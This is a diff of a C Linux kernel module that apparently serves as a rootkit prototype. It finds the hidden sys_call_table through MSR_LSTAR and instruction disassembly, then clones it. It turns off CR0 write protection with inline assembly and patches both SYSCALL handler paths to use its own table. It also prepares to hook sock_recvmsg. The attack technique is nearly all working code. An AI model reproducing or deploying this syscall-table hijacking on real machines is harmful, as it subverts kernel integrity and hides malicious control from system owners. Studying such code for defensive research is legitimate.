@@ -66,40 +66,33 @@
 //void *readfile(const char *file, size_t *len);
 int disassemble(void *code, size_t code_len);
 void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
-void *search_sct_fastcall(unsigned int **psct_addr);
+void *search_sct_fastpath(unsigned int **psct_addr);
 void *search_sct_slowpath(unsigned int **psct_addr);
 void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
 void hook_kernel_funcs(void);
-int set_memory_rw(unsigned long addr, int pages);
-int set_memory_ro(unsigned long addr, int pages);
-void *search_change_page_attr_set_clr(void *set_memory);
+//int set_memory_rw(unsigned long addr, int pages);
+//int set_memory_ro(unsigned long addr, int pages);
+//void *search_change_page_attr_set_clr(void *set_memory);
 void *search___vmalloc_node_range(void *__vmalloc);
 
 /*
  * Global variables.
  */
 void (*f_kernel_test)(void) = NULL;
-int (*f_change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages) = NULL;
+//int (*f_change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages) = NULL;
 void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
             unsigned long start, unsigned long end, gfp_t gfp_mask,
             pgprot_t prot, unsigned long vm_flags, int node,
             const void *caller) = NULL;
 
-void open_kernel(void);
-void close_kernel(void);
-
-void open_kernel(void) {
-	asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
-}
-
-void close_kernel(void) {
-	asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
-}
+void disable_wp(void);
+void enable_wp(void);
 
 int init_module(void)
 {
-	size_t kernel_len, kernel_paglen, kernel_pages;
+	size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0, my_sct_len = 0;
 	void *kernel_addr = NULL, *tmp = NULL;
+	int addr = 0, ret = 0;
 
     kernel_len = &kernel_end - &kernel_start;
     kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
@@ -123,7 +116,7 @@ int init_module(void)
 	/*
 	 * Search sys_call_table[] address.
 	 */
-	tmp = search_sct_fastcall(&psct_fastcall);
+	tmp = search_sct_fastpath(&psct_fastpath);
 	if (tmp == NULL) {
 		return 0;
 	}
@@ -137,11 +130,12 @@ int init_module(void)
      */
     f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)
 
-	pinfo("Hurra! sys_call_table = %p, fastcall_location = %p, slowpath_location = %p\n", sys_call_table, psct_fastcall, psct_slowpath);
+	pinfo("Hurra! sys_call_table = %p, fastpath_location = %p, slowpath_location = %p\n", sys_call_table, psct_fastpath, psct_slowpath);
 
 	/*
 	 * Search not exported symbols.
 	 */
+	/*
 	f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
 	if (f_change_page_attr_set_clr != NULL) {
 		pinfo("Hurra! change_page_attr_set_clr() = %p\n", f_change_page_attr_set_clr);
@@ -149,7 +143,7 @@ int init_module(void)
 		perr("Sorry, can't find change_page_attr_set_clr().\n");
 		return 0;
 	}
-
+	*/
 	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
 	if (f__vmalloc_node_range != NULL) {
 		pinfo("Hurra! __vmalloc_node_range() = %p\n", f__vmalloc_node_range);
@@ -161,7 +155,6 @@ int init_module(void)
 	/*
 	 * Reserve & clone a new (our) sys_call_table.
 	 */
-	size_t my_sct_len = 0;
 	while(sys_call_table[my_sct_len]) {
 		my_sct_len ++;
 	}
@@ -187,21 +180,30 @@ int init_module(void)
 	/*
 	 * Install the new sct.
 	 */
-	//int ret = set_memory_rw(PAGE_ROUND_DOWN(psct_fastcall), 1);
-	unsigned long addr = (unsigned long)psct_fastcall & PAGE_MASK;
-	int numpages = (PAGE_SIZE - ((unsigned long)psct_fastcall & ~PAGE_MASK) >= 4) ? 1 : 2;
-	int ret = set_memory_rw(addr, numpages);
-	pinfo("addr %p numpages %d mem rw = %d\n", addr, numpages, ret);
-	addr = (unsigned int) my_sct;
-	open_kernel();
-	ret = probe_kernel_write(psct_fastcall, &addr, 4);
-	close_kernel();
-	pinfo("%d\n", ret);
-	ret = probe_kernel_write(psct_fastcall, &addr, 4);
-	pinfo("%d\n", ret);
-	//*psct_fastcall = (unsigned int) my_sct;
-	pinfo("%p\n", *psct_fastcall);
-	set_memory_ro(PAGE_ROUND_DOWN(psct_fastcall), 1);
+	pinfo("before psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
+	addr = (int) my_sct;
+	disable_wp();
+	ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
+	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
+	enable_wp();
+	if (ret != 0) {
+		perr("Sorry, error while replacing sys_call_table on SYSCALL handler.\n");
+		return 0;
+	}
+
+	pinfo("after psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
+
+	/*
+	addr = (int) sys_call_table;
+    disable_wp();
+    ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
+	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
+    enable_wp();
+
+	pinfo("restored psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
+	*/
+
+	//set_memory_ro(PAGE_ROUND_DOWN(psct_fastpath), 1);
 
 /*
 	pinfo("%p\n", __rdmsr(MSR_LSTAR));
@@ -283,6 +285,15 @@ void cleanup_module(void)
 {
 }
 
+// from http://vulnfactory.org/blog/2011/08/12/wp-safe-or-not/
+void disable_wp(void) {
+    asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
+}
+
+void enable_wp(void) {
+    asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
+}
+
 void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, void **loc_addr) {
     csh handle;
     cs_insn *insn;
@@ -341,12 +352,14 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
 
     return NULL;
 }
-	
+
+/*	
 void *search_change_page_attr_set_clr(void *set_memory) {
 	void *tmp;
 	void *addr = disass_search_inst_addr(set_memory, "call", "%lx", 0x100, 1, &tmp);
 	return addr;
 }
+*/
 
 void *search___vmalloc_node_range(void *__vmalloc) {
 	void *tmp;
@@ -354,6 +367,7 @@ void *search___vmalloc_node_range(void *__vmalloc) {
 	return addr;
 }
 
+/*
 static inline int f_change_page_attr_set(unsigned long *addr, int numpages,
                        pgprot_t mask, int array)
 {
@@ -375,6 +389,7 @@ int set_memory_rw(unsigned long addr, int numpages) {
 int set_memory_ro(unsigned long addr, int numpages) {
 	return f_change_page_attr_clear(&addr, numpages, __pgprot(_PAGE_RW), 0);
 }
+*/
 
 void hook_kernel_funcs(void) {
 	disassemble(sock_recvmsg, 0x20);
@@ -423,7 +438,7 @@ void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_l
     return NULL;
 }
 
-void *search_sct_fastcall(unsigned int **psct_addr) {
+void *search_sct_fastpath(unsigned int **psct_addr) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	// DO NOT call disassemble() in this function as sys_write is not yet imported!
 	// or import sys_write into f_sys_write before calling:
